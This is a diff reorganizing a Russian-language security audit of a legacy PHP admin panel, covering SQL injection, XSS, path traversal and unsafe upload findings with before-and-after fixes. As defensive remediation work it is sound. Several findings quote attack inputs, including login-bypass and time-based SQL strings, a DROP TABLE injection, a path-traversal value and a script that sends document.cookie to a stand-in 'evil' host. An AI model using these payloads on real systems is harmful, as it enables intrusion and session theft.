@@ -1,48 +1,47 @@
-- [Этап 1 — SQLi и вывод данных](security-audit-SQLi.md)
-
 ## Оглавление
 
-- [0. Принципы исправления](#sec-0-принципы-исправления)
-- [1. Сводная таблица](#sec-1-сводная-таблица)
-- [2. Новые хелперы](#sec-2-новые-хелперы)
-- [3. Подробные исправления](#sec-3-подробные-исправления)
-  - [S-01 - user_auth() (functions.admin.php), Critical](#item-s-01-user-auth-functions-admin-php-critical)
-  - [S-02 - имя таблицы из $_GET["tblName"], Critical](#item-s-02-имя-таблицы-из-get-tblname-critical)
-  - [S-03 - фильтры поиска в showData(), Critical](#item-s-03-фильтры-поиска-в-showdata-critical)
-  - [S-04 - ORDER BY (sidx, sord), Critical](#item-s-04-order-by-sidx-sord-critical)
-  - [S-05 - LIMIT (page, rows), High](#item-s-05-limit-page-rows-high)
-  - [S-06 / S-07 / S-08 / S-09 - saveData(), Critical](#item-s-06-s-07-s-08-s-09-savedata-critical)
-  - [S-10 - IP пользователя, Medium](#item-s-10-ip-пользователя-medium)
-  - [S-11 - $_SESSION в WHERE (getTableWhere), Medium](#item-s-11-session-в-where-gettablewhere-medium)
-  - [S-12 - set_id.php, Critical](#item-s-12-set-id-php-critical)
-  - [S-13 - select.get.php, Critical](#item-s-13-select-get-php-critical)
-  - [S-14 - укрепление остальных идентификаторов, Low](#item-s-14-укрепление-остальных-идентификаторов-low)
-  - [S-15 - db_error(), echo $query, Medium-High](#item-s-15-db-error-echo-query-medium-high)
-  - [I-01 / I-02 - $page из REQUEST_URI, High / Medium](#item-i-01-i-02-page-из-request-uri-high-medium)
-  - [I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium](#item-i-03-i-07-сессия-и-данные-бд-в-html-js-high-medium)
-  - [I-08 - onlymy.php, Low](#item-i-08-onlymy-php-low)
-  - [I-09 / I-10 - file.upload.php, Critical / High](#item-i-09-i-10-file-upload-php-critical-high)
-  - [I-11 - очистка фото в saveData(), High](#item-i-11-очистка-фото-в-savedata-high)
-  - [I-12 - XML-ответ showData(), Medium](#item-i-12-xml-ответ-showdata-medium)
-  - [I-14 - шаблон jqgrid.html, Low](#item-i-14-шаблон-jqgrid-html-low)
-- [4. Проход по файлам](#sec-4-проход-по-файлам)
-- [5. Найдено вне рамок этапа 1 (правки **не** вносились)](#sec-5-найдено-вне-рамок-этапа-1-правки-не-вносились)
-- [6. Допущения и что проверить после внедрения](#sec-6-допущения-и-что-проверить-после-внедрения)
+- [Принципы исправления](#sec-2-principy-ispravleniya)
+- [Новые хелперы](#sec-3-novye-helpery)
+- [Подробные исправления](#sec-4-podrobnye-ispravleniya)
+    - [S-01 - `user_auth()` (`functions.admin.php`), Critical](#sec-5-s-01-user-auth-functions-admin-php-critical)
+    - [S-02 - имя таблицы из `$_GET["tblName"]`, Critical](#sec-6-s-02-imya-tablicy-iz-get-tblname-critical)
+    - [S-03 - фильтры поиска в `showData()`, Critical](#sec-7-s-03-filtry-poiska-v-showdata-critical)
+    - [S-04 - `ORDER BY` (`sidx`, `sord`), Critical](#sec-8-s-04-order-by-sidx-sord-critical)
+    - [S-05 - `LIMIT` (`page`, `rows`), High](#sec-9-s-05-limit-page-rows-high)
+    - [S-06 / S-07 / S-08 / S-09 - `saveData()`, Critical](#sec-10-s-06-s-07-s-08-s-09-savedata-critical)
+    - [S-10 - IP пользователя, Medium](#sec-11-s-10-ip-polzovatelya-medium)
+    - [S-11 - `$_SESSION` в `WHERE` (`getTableWhere`), Medium](#sec-12-s-11-session-v-where-gettablewhere-medium)
+    - [S-12 - `set_id.php`, Critical](#sec-13-s-12-set-id-php-critical)
+    - [S-13 - `select.get.php`, Critical](#sec-14-s-13-select-get-php-critical)
+    - [S-14 - укрепление остальных идентификаторов, Low](#sec-15-s-14-ukreplenie-ostalnyh-identifikatorov-low)
+    - [S-15 - `db_error()`, `echo $query`, Medium-High](#sec-16-s-15-db-error-echo-query-medium-high)
+    - [I-01 / I-02 - `$page` из `REQUEST_URI`, High / Medium](#sec-17-i-01-i-02-page-iz-request-uri-high-medium)
+    - [I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium](#sec-18-i-03-i-07-sessiya-i-dannye-bd-v-html-js-high-medium)
+    - [I-08 - `onlymy.php`, Low](#sec-19-i-08-onlymy-php-low)
+    - [I-09 / I-10 - `file.upload.php`, Critical / High](#sec-20-i-09-i-10-file-upload-php-critical-high)
+    - [I-11 - очистка фото в `saveData()`, High](#sec-21-i-11-ochistka-foto-v-savedata-high)
+    - [I-12 - XML-ответ `showData()`, Medium](#sec-22-i-12-xml-otvet-showdata-medium)
+    - [I-14 - шаблон `jqgrid.html`, Low](#sec-23-i-14-shablon-jqgrid-html-low)
+- [Сводная таблица](#sec-1-сводная-таблица)
+    - [SQL-инъекции](#sec-24-sql-inekcii)
+    - [Данные из запроса/сессии в другие места](#sec-25-dannye-iz-zaprosa-sessii-v-drugie-mesta)
 
----
 
-# Аудит безопасности legacy-админки (PHP / mysqli) - Этап 1
+# Аудит безопасности - SQLi, этап 1
 
-**Область этапа 1:** (1) все места, где `$_GET` / `$_POST` / `$_REQUEST` / `$_FILES` / `$_SERVER` / `$_SESSION` попадают в SQL и в другие места (JS, HTML, пути файлов, `include`) без проверки; (2) полная защита от SQL-инъекций на `mysqli`.
+**Область:** 
+
+1. все места, где `$_GET` / `$_POST` / `$_REQUEST` / `$_FILES` / `$_SERVER` / `$_SESSION` попадают в SQL и в другие места (JS, HTML, пути файлов, `include`) без проверки; 
+
+2. полная защита от SQL-инъекций на `mysqli`.
+
 **Без сильного рефакторинга:** структура файлов, классы и сигнатуры сохранены. Добавлены только хелперы в `php/functions.php` и несколько приватных методов в `ObjectTable`.
 
-Проверено файл за файлом: 17 файлов (раздел 4). Остальные найденные проблемы, не относящиеся к этапу 1, вынесены в раздел 5 **без правок**.
 
-<a id="sec-0-принципы-исправления"></a>
-## 0. Принципы исправления
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-2-principy-ispravleniya"></a>
+## Принципы исправления
 
 | Проблема | Решение |
 |---|---|
@@ -55,67 +54,9 @@
 
 ---
 
-<a id="sec-1-сводная-таблица"></a>
-## 1. Сводная таблица
-
 [🔝 Наверх](#оглавление)
-
-
-Severity: **Critical** - удалённое выполнение/полный обход защиты/чтение-запись БД; **High** - серьёзное, эксплуатируется легко; **Medium** - ограниченный эффект или нужны условия; **Low** - укрепление.
-
-### 1.1 SQL-инъекции
-
-[🔝 Наверх](#оглавление)
-
-
-| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
-|---|---|---|---|---|---|
-| S-01 | `functions.admin.php` `user_auth()` | Critical | `NL_USER_LOGIN = '" . $login . "'` | `NL_USER_LOGIN = ?`, `aes_encrypt(?, ?)`, `db_prepared()` | Обход входа (`' OR 1=1 --`), выгрузка данных через UNION |
-| S-02 | `ObjectTable::__construct`, `jqgrid.show/edit/table.php` | Critical | `$tblName = $_GET["tblName"]` -> `FROM " . $this->dbName` | `ObjectTable::TABLES` + `isAllowedTable()`, `db_ident()` | Чтение/запись произвольной таблицы, SQLi в имени таблицы |
-| S-03 | `showData()` фильтры | Critical | `"$search_field = $value"`, `LIKE '%" . $value . "%'`, имя поля из ключа `$_GET` | `buildSearchWhere()`: поле из белого списка колонок, значение через `?` | SQLi через значения и имена полей фильтра |
-| S-04 | `getData()` `ORDER BY` | Critical | `" ORDER BY " . $sidx . " " . $sord` | `getSafeOrderBy()`: колонка из белого списка, `ASC/DESC` | SQLi в `ORDER BY` (subquery, time-based) |
-| S-05 | `showData()/getData()` `LIMIT` | High | `"LIMIT " . $limit * ($page - 1) . ", " . $limit` | `(int)`, границы 1..1000, `LIMIT ?, ?` | SQLi/DoS через `page`, `rows` |
-| S-06 | `saveData()` выбор/UPDATE/DELETE по `$id` | Critical | `"... WHERE ID_" . $this->dbName . " = " . $id` | `FILTER_VALIDATE_INT` + `= ?` | SQLi (даже без кавычек), массовое удаление/правка |
-| S-07 | `saveData()` значения полей в INSERT/UPDATE | Critical | `"'" . $post[...] . "'"`, `array_push($values, $post[...])` для чисел, `AES_ENCRYPT('...','" . AESKEY . "')` | `prepareValue()` (проверка типа) + `?` / `AES_ENCRYPT(?, ?)` | SQLi через любое поле формы, включая числовые (без кавычек) |
-| S-08 | `saveData()` `$oper` в лог | Critical | `VALUES(..., '" . $oper . "', ...)` | `in_array($oper, ["add","edit","del"], true)` + `?` | SQLi через `oper`, выполнение пустого/произвольного запроса |
-| S-09 | `saveData()` лог изменений (`NL_LOG_DETAIL`) | High | `"'" . $row_cur[...] . "'"`, `"'" . $post[...] . "'"` | `VALUES (?, ?, ?, ?)` | SQLi 2-го порядка (payload из БД срабатывает в логе) |
-| S-10 | `saveData()` IP из заголовков | Medium | `'" . $user_ip . "'` (`X-Forwarded-For`, `Client-IP`...) | `FILTER_VALIDATE_IP` + `?`; `split()` -> `explode()` | SQLi через заголовок; фатальная ошибка `split()` в PHP 7+ |
-| S-11 | `getTableWhere()` (сессия в SQL) | Medium | `"(2 = " . $_SESSION["ID_NL_USER_PERMISSION"] . ")"` | `(int)($_SESSION[...] ?? 0)` | SQLi 2-го порядка через значения сессии |
-| S-12 | `set_id.php` | Critical | `TABLE_NAME = '" . $tbl . "'`, `ALTER TABLE " . $tbl` | `ObjectTable::isAllowedTable()`, `?`, `db_ident()`, `$_POST` вместо `$_REQUEST` | SQLi и инъекция в DDL (`ALTER`) |
-| S-13 | `select.get.php` | Critical | `"SELECT * FROM " . $tblChild . " WHERE ID_" . $tblParent . " = " . $idParent` | белый список таблиц, `db_ident()`, `FILTER_VALIDATE_INT`, `= ?` | SQLi + чтение любой таблицы |
-| S-14 | `getData()` `AES_DECRYPT`, `get_query_left_joins()`, выбор справочников | Low | `AES_DECRYPT(" . $col->dbName . ",'" . AESKEY . "')`, `" LEFT JOIN " . $lj` | ``AES_DECRYPT(tbl.`col`, ?)``, `db_ident()` | Укрепление: ключ не в тексте SQL, идентификаторы проверяются |
-| S-15 | `db_error()` и `echo $query;` | High | `return "...Ошибка в запросе:<br />" . $query`, `echo $query;` | generic-сообщение + `error_log`; `echo` удалён | Раскрытие структуры БД и отражённый XSS через текст запроса |
-
-### 1.2 Данные из запроса/сессии в другие места
-
-[🔝 Наверх](#оглавление)
-
-
-| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
-|---|---|---|---|---|---|
-| I-01 | `functions.admin.php` верх, `includeAdminPartsByLvl()` | High | `$page` из `REQUEST_URI` -> `include ".../parts/" . $page . ".php"` | `preg_match('/^[A-Za-z0-9_-]+$/')` | Path traversal / LFI в `include` |
-| I-02 | `index.php` | Medium | `<?= $page ?>` в `class="..."` | `html_esc($page)` + валидация `$page` | Отражённый XSS через URL |
-| I-03 | `parts/main.php` | Medium | `<?= $_SESSION["NL_USER_SHORT"] ?>` | `htmlspecialchars(...)` | Сохранённый XSS через имя пользователя |
-| I-04 | `getjqGridCustom()` | High | `!= "' . $_SESSION["NL_USER_SHORT"] . '"` в `<script>` | `js_str($_SESSION["NL_USER_SHORT"] ?? "")` | Внедрение JS / XSS (имя редактируется любым сотрудником) |
-| I-05 | `renderTable()` `defaultValue` | High | `'defaultValue : "' . $col->defValue . '"'` (телефон из сессии) | `js_str($col->defValue)` | Внедрение JS через телефон |
-| I-06 | `getMainTableCol()`, `renderTable()` | Low | `defValue = $_SESSION["ID_NL_USER"]`, `== ' . $_SESSION["ID_NL_USER"] . ')` в JS | `(int)(...)` | Нечисловое значение сессии в JS |
-| I-07 | `renderTable()` значения `select` | High | `mb_ereg_replace('"', '\\"', $row[...])` (экранируется только `"`) | `js_str($selectOptions)` | Внедрение JS через элемент справочника (`\`, `</script>`) |
-| I-08 | `onlymy.php` | Low | `$_SESSION["onlymy"] = $_POST["onlymy"];` | только `"1"` / `"0"` | Произвольные данные в сессии |
-| I-09 | `file.upload.php` путь | Critical | `$tbl/$col/$id = $_REQUEST[...]` -> `"/img/" . $dir . "/" . $col . "_" . $id`; `mb_ereg_replace($tbl . "_", ...)` | белый список таблицы и колонки, `ctype_digit($id)` | Path traversal (запись файла вне `/img`), regex-инъекция |
-| I-10 | `file.upload.php` расширение | High | чёрный список `.php .phtml .php3 .php4 .php5` | белый список `jpg/jpeg/png/gif/webp` + `getimagesize` | Загрузка `.phar/.php7/.pht/.phps` и т.п. -> RCE |
-| I-11 | `saveData()` очистка фото | High | `glob(... $trueId ...)` где `$trueId = $values[0]` из `$_POST`, затем `unlink` | `$trueId` = валидированное целое | Удаление чужих `.jpg` (`*`, `../`) |
-| I-12 | `showData()` XML | Medium | `"<page>" . $page`, `<row id="` . $data[$i][0], `CDATA[` . $data . `]]>` | `(int)`, `htmlspecialchars(ENT_XML1)`, разрыв `]]>` | Инъекция в XML-ответ |
-| I-13 | `select.get.php` вывод | Medium | `'<option value="' . $row[...] . '">' . $row[...]` | `html_esc()` | Сохранённый XSS через справочники |
-| I-14 | `renderTable()` шаблон | Low | `mb_ereg_replace("{colModel}", $colModel, ...)` | `str_replace(...)` | Regex/`\0` обратные ссылки в подстановке данных |
-| I-15 | `db_connect()` | Low | `printf("Ошибка подключения к базе: %s", $mysqli->connect_error)` | `error_log` + generic | Раскрытие хоста/пользователя БД |
-
----
-
-<a id="sec-2-новые-хелперы"></a>
-## 2. Новые хелперы
-
-[🔝 Наверх](#оглавление)
-
+<a id="sec-3-novye-helpery"></a>
+## Новые хелперы
 
 ```php
 // Подготовленный запрос: данные ТОЛЬКО через $params (`php/functions.php`)
@@ -162,17 +103,15 @@ function js_str($value) {
 
 ---
 
-<a id="sec-3-подробные-исправления"></a>
-## 3. Подробные исправления
 
 [🔝 Наверх](#оглавление)
+<a id="sec-4-podrobnye-ispravleniya"></a>
+## Подробные исправления
 
 
-<a id="item-s-01-user-auth-functions-admin-php-critical"></a>
+[🔝 Наверх](#оглавление)
+<a id="sec-5-s-01-user-auth-functions-admin-php-critical"></a>
 ### S-01 - `user_auth()` (`functions.admin.php`), Critical
-
-[🔝 Наверх](#оглавление)
-
 **Причина:** логин и пароль из `$_POST` конкатенируются в SQL. `admin' -- ` в логине полностью отключает проверку пароля. Также в функцию может прийти не строка (`login[]=...`).
 
 **Было:**
@@ -203,11 +142,10 @@ if (db_num_rows($res) > 0) {
 
 ---
 
-<a id="item-s-02-имя-таблицы-из-get-tblname-critical"></a>
-### S-02 - имя таблицы из `$_GET["tblName"]`, Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-6-s-02-imya-tablicy-iz-get-tblname-critical"></a>
+### S-02 - имя таблицы из `$_GET["tblName"]`, Critical
 **Причина:** `jqgrid.show.php`, `jqgrid.edit.php`, `jqgrid.table.php` создают `new ObjectTable($_GET["tblName"])`; имя идёт в `FROM`, `UPDATE`, `DELETE`, `INSERT`, `glob`, а также в JS/HTML шаблона (`{tableName}`). Плейсхолдером имя таблицы не передать, значит нужен белый список.
 
 **Было:**
@@ -239,11 +177,10 @@ function __construct($tableName) {
 
 ---
 
-<a id="item-s-03-фильтры-поиска-в-showdata-critical"></a>
-### S-03 - фильтры поиска в `showData()`, Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-7-s-03-filtry-poiska-v-showdata-critical"></a>
+### S-03 - фильтры поиска в `showData()`, Critical
 **Причина:** каждый параметр `$_GET`, в имени которого есть `NL_`, превращается в условие: и **имя поля**, и **значение** подставляются в SQL. Для числовых колонок значение идёт вообще без кавычек: `NL_PROP_RESALE_FLOOR=1 OR 1=1`, `..._COST_TOTAL_from=0 UNION SELECT ...`.
 
 **Было:**
@@ -296,11 +233,10 @@ private function buildSearchWhere($source) {
 
 ---
 
-<a id="item-s-04-order-by-sidx-sord-critical"></a>
-### S-04 - `ORDER BY` (`sidx`, `sord`), Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-8-s-04-order-by-sidx-sord-critical"></a>
+### S-04 - `ORDER BY` (`sidx`, `sord`), Critical
 **Причина:** `$_GET['sidx']` и `$_GET['sord']` конкатенируются в `ORDER BY`; там работают подзапросы и time-based инъекции (`sidx=(SELECT IF(...,SLEEP(5),1))`). Значения нельзя передать плейсхолдером.
 
 **Было:**
@@ -332,11 +268,10 @@ private function getSafeOrderBy($sidx, $sord) {
 
 ---
 
-<a id="item-s-05-limit-page-rows-high"></a>
-### S-05 - `LIMIT` (`page`, `rows`), High
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-9-s-05-limit-page-rows-high"></a>
+### S-05 - `LIMIT` (`page`, `rows`), High
 **Причина:** `$_GET['page']` и `$_GET['rows']` идут в `LIMIT` и в XML как есть. `rows=1000000` - DoS, а `page`/`rows` - вектор инъекции.
 
 **Было:**
@@ -358,11 +293,10 @@ $params[] = max(0, (int)$limit);
 
 ---
 
-<a id="item-s-06-s-07-s-08-s-09-savedata-critical"></a>
-### S-06 / S-07 / S-08 / S-09 - `saveData()`, Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-10-s-06-s-07-s-08-s-09-savedata-critical"></a>
+### S-06 / S-07 / S-08 / S-09 - `saveData()`, Critical
 **Причина:** метод вызывается из `jqgrid.edit.php` со всем `$_POST`. Из него в SQL склеиваются `$id`, `$oper`, значения полей (числовые без кавычек), старые значения из БД для лога, ключ AES.
 
 **Было (ключевые места):**
@@ -427,11 +361,10 @@ db_prepared($query, $query_params) or die(db_error($query));       // echo $quer
 - S-09: старые значения из БД больше не склеиваются в лог, что закрывает SQLi 2-го порядка (payload, сохранённый ранее, срабатывал при следующем редактировании).
 - S-15: клиенту больше не возвращается текст запроса.
 
-<a id="item-s-10-ip-пользователя-medium"></a>
-### S-10 - IP пользователя, Medium
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-11-s-10-ip-polzovatelya-medium"></a>
+### S-10 - IP пользователя, Medium
 **Причина:** при отсутствии `REMOTE_ADDR` IP берётся из заголовков `HTTP_X_FORWARDED_FOR`, `HTTP_CLIENT_IP`, `HTTP_VIA` и др. (их задаёт клиент) и склеивается в SQL. Ветка `15 < strlen` вызывает `split()`, удалённую в PHP 7 (фатальная ошибка).
 
 **Было:**
@@ -448,11 +381,10 @@ if (filter_var($user_ip, FILTER_VALIDATE_IP) === false) { $user_ip = 'unknown'; 
 ```
 **Решает:** инъекцию через заголовок и падение на длинных значениях.
 
-<a id="item-s-11-session-в-where-gettablewhere-medium"></a>
-### S-11 - `$_SESSION` в `WHERE` (`getTableWhere`), Medium
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-12-s-11-session-v-where-gettablewhere-medium"></a>
+### S-11 - `$_SESSION` в `WHERE` (`getTableWhere`), Medium
 **Причина:** значения из сессии (взятые из БД) подставлялись в SQL как есть. Любая строка, попавшая в сессию, - SQLi 2-го порядка.
 
 **Было:**
@@ -467,11 +399,10 @@ return "(tbl.ID_NL_USER = " . (int)($_SESSION["ID_NL_USER"] ?? 0) . ")";
 ```
 **Решает:** в условие попадает только число. Условия без пользовательских строк оставлены литералами (int-cast достаточен), чтобы не менять структуру `$this->where`.
 
-<a id="item-s-12-set-id-php-critical"></a>
-### S-12 - `set_id.php`, Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-13-s-12-set-id-php-critical"></a>
+### S-12 - `set_id.php`, Critical
 **Причина:** `$_REQUEST["table"]` (включает GET/POST/COOKIE) подставляется в запрос к `INFORMATION_SCHEMA` **и в DDL** `ALTER TABLE`; DDL нельзя параметризовать, поэтому допустимо только имя из белого списка.
 
 **Было:**
@@ -491,11 +422,10 @@ $query = "ALTER TABLE " . db_ident($tbl) . " AUTO_INCREMENT = " . ($id + 1);
 ```
 **Решает:** SQLi и инъекцию в DDL (`x; DROP TABLE ...`, `ALTER` произвольной таблицы). JS (`defValue` в `getMainTableCol`) шлёт именно POST.
 
-<a id="item-s-13-select-get-php-critical"></a>
-### S-13 - `select.get.php`, Critical
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-14-s-13-select-get-php-critical"></a>
+### S-13 - `select.get.php`, Critical
 **Причина:** три параметра `$_POST` собираются в запрос, плюс значения БД печатаются в HTML без экранирования. Функции `db_fetch_array` нет в приложенном `functions.php` (вызов падает), поэтому используется `db_fetch_assoc`.
 
 **Было:**
@@ -517,11 +447,10 @@ $options .= '<option value="' . html_esc($row["ID_" . $tblChild] ?? "") . '">' .
 ```
 **Решает:** SQLi, чтение произвольной таблицы, XSS в `<option>`.
 
-<a id="item-s-14-укрепление-остальных-идентификаторов-low"></a>
-### S-14 - укрепление остальных идентификаторов, Low
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-15-s-14-ukreplenie-ostalnyh-identifikatorov-low"></a>
+### S-14 - укрепление остальных идентификаторов, Low
 Имена, формируемые из кода (`AES_DECRYPT(col)`, `LEFT JOIN`, таблица справочника в `renderTable()`), не приходят от пользователя, но теперь тоже проходят через `db_ident()`, а ключ AES передаётся как параметр.
 
 **Было:**
@@ -538,11 +467,10 @@ $query = "SELECT * FROM " . db_ident($selectTableName);
 ```
 **Решает:** защита в глубину: случайное изменение таблиц/колонок не превратится в инъекцию.
 
-<a id="item-s-15-db-error-echo-query-medium-high"></a>
-### S-15 - `db_error()`, `echo $query`, Medium-High
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-16-s-15-db-error-echo-query-medium-high"></a>
+### S-15 - `db_error()`, `echo $query`, Medium-High
 **Причина:** `die(db_error($query))` печатает в браузер **полный текст запроса** со значениями пользователя: раскрытие структуры БД и отражённый XSS (значение из формы попадает в HTML).
 
 **Было:**
@@ -564,11 +492,10 @@ function db_error($query) {
 
 ---
 
-<a id="item-i-01-i-02-page-из-request-uri-high-medium"></a>
-### I-01 / I-02 - `$page` из `REQUEST_URI`, High / Medium
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-17-i-01-i-02-page-iz-request-uri-high-medium"></a>
+### I-01 / I-02 - `$page` из `REQUEST_URI`, High / Medium
 **Причина:** `$page` берётся из `REQUEST_URI` (сырой, не декодированный, без нормализации: `curl --path-as-is`), подставляется в `include` и в атрибуты `class`. Значения вроде `../../x` дают path traversal, а `"><script>` - XSS.
 
 **Было:**
@@ -591,11 +518,10 @@ if (preg_match('/^[A-Za-z0-9_-]+$/', $page) && file_exists($main_file)) { includ
 ```
 **Решает:** LFI/path traversal в `include` (вместе с `.php` на конце это включение любого `.php` на сервере) и отражённый XSS. Поведение страниц `login` / `main` не меняется.
 
-<a id="item-i-03-i-07-сессия-и-данные-бд-в-html-js-high-medium"></a>
-### I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-18-i-03-i-07-sessiya-i-dannye-bd-v-html-js-high-medium"></a>
+### I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium
 **Причина:** `NL_USER_SHORT` и `NL_USER_PHONE` вводятся в справочнике «Пользователи» (а с учётом N-01/N-02 их может изменить не только администратор), попадают в сессию и подставляются в HTML и в `<script>` без экранирования. Например, краткое имя `"; fetch('//evil/'+document.cookie);//` выполнится у каждого, чей интерфейс его выводит (в т.ч. у администратора). Так же значения справочников в `value : "..."`: экранировался только `"`, а `\`, `</script>` нет.
 
 **Было:**
@@ -628,11 +554,10 @@ if ($(formid.selector + " #ID_NL_USER").val() == ' . (int)($_SESSION["ID_NL_USER
 **Решает:** XSS/внедрение JS через сессионные значения и справочники. `js_str` экранирует кавычки, `\`, переводы строк и `< > &` (нельзя закрыть `</script>`).
 *Замечание:* формат jqGrid `value` - строка `id:текст;id:текст`; `:` или `;` в названии справочника ломают разбор и раньше (функциональное ограничение, не безопасность).
 
-<a id="item-i-08-onlymy-php-low"></a>
-### I-08 - `onlymy.php`, Low
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-19-i-08-onlymy-php-low"></a>
+### I-08 - `onlymy.php`, Low
 **Было:**
 ```php
 $_SESSION["onlymy"] = $_POST["onlymy"];
@@ -643,11 +568,10 @@ $_SESSION["onlymy"] = (($_POST["onlymy"] ?? "") === "1") ? "1" : "0";
 ```
 **Решает:** в сессию попадает только флаг, а не произвольные данные/массив (значение потом сравнивается в `getTableWhere` и выводится в `main.php`).
 
-<a id="item-i-09-i-10-file-upload-php-critical-high"></a>
-### I-09 / I-10 - `file.upload.php`, Critical / High
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-20-i-09-i-10-file-upload-php-critical-high"></a>
+### I-09 / I-10 - `file.upload.php`, Critical / High
 **Причина:** `table`, `col`, `id` из `$_REQUEST` (включая COOKIE) идут в имя файла: `table=../../../var/www/html/x` даёт запись вне `/img`. `$tbl` используется как **регулярное выражение** в `mb_ereg_replace`. Защита от PHP - чёрный список из 5 расширений (`.phar`, `.php7`, `.pht`, `.phps`, `.htaccess`, `.inc` проходят). Проверки ошибки загрузки нет.
 
 **Было:**
@@ -681,11 +605,10 @@ if ($colObj->type !== "file" && @getimagesize($baseTmpName) === false) { upload_
 ```
 **Решает:** запись за пределы `/img`, regex-инъекцию, загрузку исполняемых файлов. Все части имени файла теперь либо из кода, либо цифры, либо из белого списка. Подробнее об ограничении выполнения PHP в `/img` - раздел 5 (N-07).
 
-<a id="item-i-11-очистка-фото-в-savedata-high"></a>
-### I-11 - очистка фото в `saveData()`, High
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-21-i-11-ochistka-foto-v-savedata-high"></a>
+### I-11 - очистка фото в `saveData()`, High
 **Причина:** маска `glob()` строилась из `$values[0]` - первого значения формы (ID записи), то есть из `$_POST`. `ID_NL_PROP_RESALE=*` или `../../..` позволяют удалить `unlink()`-ом чужие `.jpg`. Кроме того, `count(json_decode(...))` падает на невалидном JSON (PHP 8).
 
 **Было:**
@@ -710,11 +633,10 @@ if ($trueId > 0) {
 ```
 **Решает:** произвольное удаление файлов и падение на битом JSON. `trueId = 0` (запись без id) больше не превращается в маску `col_*.jpg`, удалявшую фото всех записей.
 
-<a id="item-i-12-xml-ответ-showdata-medium"></a>
-### I-12 - XML-ответ `showData()`, Medium
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-22-i-12-xml-otvet-showdata-medium"></a>
+### I-12 - XML-ответ `showData()`, Medium
 **Причина:** `page`/`total`/`records` и значения ячеек выводятся в XML без экранирования; строка `]]>` в данных закрывает `CDATA` и позволяет внедрить разметку.
 
 **Было:**
@@ -730,11 +652,10 @@ $s .= '<cell><![CDATA[' . str_replace("]]>", "]]]]><![CDATA[>", (string)$data[$i
 ```
 **Решает:** внедрение в XML. Экранирование HTML-содержимого ячеек (stored XSS при рендере jqGrid) сознательно не делается на этом этапе: оно зависит от `js.combined.js` (formatters `photosFormatter`, Quill), которого нет во вложении; см. N-06.
 
-<a id="item-i-14-шаблон-jqgrid-html-low"></a>
-### I-14 - шаблон `jqgrid.html`, Low
 
 [🔝 Наверх](#оглавление)
-
+<a id="sec-23-i-14-shablon-jqgrid-html-low"></a>
+### I-14 - шаблон `jqgrid.html`, Low
 **Было / стало:**
 ```php
 $jqGridHtml = mb_ereg_replace("{colModel}", $colModel, $jqGridHtml);
@@ -744,75 +665,56 @@ $jqGridHtml = str_replace("{colModel}", $colModel, $jqGridHtml);      // то ж
 
 ---
 
-<a id="sec-4-проход-по-файлам"></a>
-## 4. Проход по файлам
+[🔝 Наверх](#оглавление)
+<a id="sec-1-сводная-таблица"></a>
+## Сводная таблица
+
+Severity: **Critical** - удалённое выполнение/полный обход защиты/чтение-запись БД; **High** - серьёзное, эксплуатируется легко; **Medium** - ограниченный эффект или нужны условия; **Low** - укрепление.
+
 
 [🔝 Наверх](#оглавление)
+<a id="sec-24-sql-inekcii"></a>
+### SQL-инъекции
+
+| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
+|---|---|---|---|---|---|
+| S-01 | `functions.admin.php` `user_auth()` | Critical | `NL_USER_LOGIN = '" . $login . "'` | `NL_USER_LOGIN = ?`, `aes_encrypt(?, ?)`, `db_prepared()` | Обход входа (`' OR 1=1 --`), выгрузка данных через UNION |
+| S-02 | `ObjectTable::__construct`, `jqgrid.show/edit/table.php` | Critical | `$tblName = $_GET["tblName"]` -> `FROM " . $this->dbName` | `ObjectTable::TABLES` + `isAllowedTable()`, `db_ident()` | Чтение/запись произвольной таблицы, SQLi в имени таблицы |
+| S-03 | `showData()` фильтры | Critical | `"$search_field = $value"`, `LIKE '%" . $value . "%'`, имя поля из ключа `$_GET` | `buildSearchWhere()`: поле из белого списка колонок, значение через `?` | SQLi через значения и имена полей фильтра |
+| S-04 | `getData()` `ORDER BY` | Critical | `" ORDER BY " . $sidx . " " . $sord` | `getSafeOrderBy()`: колонка из белого списка, `ASC/DESC` | SQLi в `ORDER BY` (subquery, time-based) |
+| S-05 | `showData()/getData()` `LIMIT` | High | `"LIMIT " . $limit * ($page - 1) . ", " . $limit` | `(int)`, границы 1..1000, `LIMIT ?, ?` | SQLi/DoS через `page`, `rows` |
+| S-06 | `saveData()` выбор/UPDATE/DELETE по `$id` | Critical | `"... WHERE ID_" . $this->dbName . " = " . $id` | `FILTER_VALIDATE_INT` + `= ?` | SQLi (даже без кавычек), массовое удаление/правка |
+| S-07 | `saveData()` значения полей в INSERT/UPDATE | Critical | `"'" . $post[...] . "'"`, `array_push($values, $post[...])` для чисел, `AES_ENCRYPT('...','" . AESKEY . "')` | `prepareValue()` (проверка типа) + `?` / `AES_ENCRYPT(?, ?)` | SQLi через любое поле формы, включая числовые (без кавычек) |
+| S-08 | `saveData()` `$oper` в лог | Critical | `VALUES(..., '" . $oper . "', ...)` | `in_array($oper, ["add","edit","del"], true)` + `?` | SQLi через `oper`, выполнение пустого/произвольного запроса |
